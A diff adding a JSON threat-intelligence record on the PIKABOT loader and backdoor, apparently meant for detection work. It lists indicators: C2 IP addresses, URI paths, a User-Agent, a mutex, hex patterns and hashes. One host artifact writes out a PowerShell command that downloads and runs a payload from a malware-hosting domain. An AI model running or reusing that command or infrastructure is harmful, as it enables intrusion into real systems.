@@ -1,0 +1,339 @@
+{
+  "malware_family": "PIKABOT",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "PIKABOT is a loader and backdoor with an updated variant that uses a new unpacking method and heavy obfuscation. The core component now uses RC4 for network communications and string decryption, has a plaintext configuration in memory, and performs extensive anti-debugging and anti-analysis checks. The malware communicates over HTTPS using a hardcoded User-Agent and a list of specific API-like URIs.",
+  "mitre_techniques": [
+    "T1566",
+    "T1204.001",
+    "T1620",
+    "T1082",
+    "T1055",
+    "T1573"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "powershell Invoke-WebRequest https://gloverstech.com/tJWz9/0.2343379541861872.dat -OutFile %SYSTEMDRIVE%\\Users\\Public\\Jrdhtjydhjf.exe; saps %SYSTEMDRIVE%\\Users\\Public\\Jrdhtjydhjf.exe",
+      "context": "Executed by obfuscated JavaScript via WScript.Shell to download and run loader.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Jrdhtjydhjf.exe",
+      "context": "Filename for the downloaded PIKABOT loader.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%SYSTEMDRIVE%\\Users\\Public\\Jrdhtjydhjf.exe",
+      "context": "File path for the downloaded PIKABOT loader.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "grepWinNP3.exe",
+      "context": "Legitimate tool tampered with to act as the PIKABOT loader.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ctfmon.exe",
+      "context": "Legitimate process created in a suspended state for process injection.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "{6F70D3AF-34EF-433C-A803-E83654F6FD7C}",
+      "context": "Mutex created by the PIKABOT core to prevent reinfection.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1.8.32-beta",
+      "context": "Version string for the PIKABOT core module, passed in network requests.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x419",
+      "context": "Language ID for Russian; malware exits if detected.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x422",
+      "context": "Language ID for Ukrainian; malware exits if detected.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ProcessHacker.exe",
+      "context": "Process name checked as part of anti-analysis routine.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "x64dbg.exe",
+      "context": "Process name checked as part of anti-analysis routine.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "idaq64.exe",
+      "context": "Process name checked as part of anti-analysis routine.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "Wireshark.exe",
+      "context": "Process name checked as part of anti-analysis routine.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ProcessDebugPort",
+      "context": "ProcessInformationClass enum used for anti-debugging.",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SystemKernelDebuggerInformation",
+      "context": "Parameter for ZwQuerySystemInformation to detect kernel debuggers.",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 68 9B 8B 16 88 E8 73 FF FF FF }",
+      "context": "PIKABOT loader calling syscall wrapper for ZwQueryInformationProcess.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 68 B2 CE 2E CF E8 5F FF FF FF }",
+      "context": "PIKABOT loader calling syscall wrapper for ZwCreateUserProcess.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 72 26 [6] 6F 24 [6] CB 0A [6] 6C 03 [6] 92 07 }",
+      "context": "PIKABOT core command handler table from YARA rule.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ZwQueryInformationProcess",
+      "context": "API name resolved by stage 2 loader via hashing.",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "unknown",
+      "hash_value": "88168B9B"
+    },
+    {
+      "kind": "unique_string",
+      "value": "ZwCreateUserProcess",
+      "context": "API name resolved by stage 2 loader via hashing.",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "unknown",
+      "hash_value": "CF2ECEB2"
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "gloverstech.com",
+      "context": "Hosting infrastructure for PIKABOT loader.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "entrevientos.com.ar",
+      "context": "Hosting infrastructure for initial zip archive.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://gloverstech.com/tJWz9/0.2343379541861872.dat",
+      "context": "URL used to download the PIKABOT loader payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7166; Pro)",
+      "context": "Hardcoded User-Agent string used for all C2 communications.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "158.220.80.167:2967",
+      "context": "PIKABOT C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "139.84.237.229:2967",
+      "context": "PIKABOT C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "85.239.243.155:5000",
+      "context": "PIKABOT C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.129.55.104:2223",
+      "context": "PIKABOT C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/admin.teams.settings.setIcon",
+      "context": "One of several hardcoded URI paths randomly chosen for C2 requests.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/admin.conversations.convertToPrivate",
+      "context": "One of several hardcoded URI paths randomly chosen for C2 requests.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/admin.emoji.add",
+      "context": "One of several hardcoded URI paths randomly chosen for C2 requests.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/admin.users.session.reset",
+      "context": "One of several hardcoded URI paths randomly chosen for C2 requests.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/apps.permissions.users.list",
+      "context": "One of several hardcoded URI paths randomly chosen for C2 requests.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "2f66fb872c9699e04e54e5eaef982784b393a5ea260129a1e2484dd273a5a88b",
+      "description": "Opc.zip: Zip archive holding obfuscated Javascript"
+    },
+    {
+      "sha256": "ca5fb5814ec62c8f04936740aabe2664b3c7d036203afbd8425cd67cf1f4b79d",
+      "description": "grepWinNP3.exe: PIKABOT loader"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "archive"
+  ]
+}
